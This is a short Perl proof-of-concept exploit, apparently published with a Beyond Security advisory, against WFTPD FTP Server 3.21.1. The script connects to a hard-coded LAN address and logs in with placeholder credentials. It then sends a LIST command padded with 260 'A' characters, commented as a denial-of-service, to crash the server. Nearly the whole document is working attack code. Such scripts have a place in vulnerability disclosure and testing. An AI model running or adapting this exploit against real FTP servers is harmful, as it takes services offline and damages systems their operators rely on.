#!/usr/bin/perl
# Multiple Vulnerabilities in WFTPD FTP Server version 3.21.1
# Created by Beyond Security Ltd. - All rights reserved.

use IO::Socket;

$host = "192.168.1.243";

$remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "2119");

unless ($remote) { die "cannot connect to ftp daemon on $host" }

print "connected\n";
while (<$remote>)
{
 print $_;
 if (/220 /)
 {
  last;
 }
}


$remote->autoflush(1);

my $ftp = "USER username\r\n";

print $remote $ftp;
print $ftp;
sleep(1);

while (<$remote>)
{
 print $_;
 if (/331 /)
 {
  last;
 }
}

$ftp = join("", "PASS ", "password", "\r\n");
print $remote $ftp;
print $ftp;
sleep(1);

while (<$remote>)
{
 print $_;
 if (/230 /)
 {
  last;
 }
}

$ftp = join ("", "LIST ", "A"x260, "\r\n"); # DoS ...

print $remote $ftp;
print $ftp;
sleep(1);

while (<$remote>)
{
 print $_;
 if (/250 Done/)
 {
  last;
 }
}

close $remote;
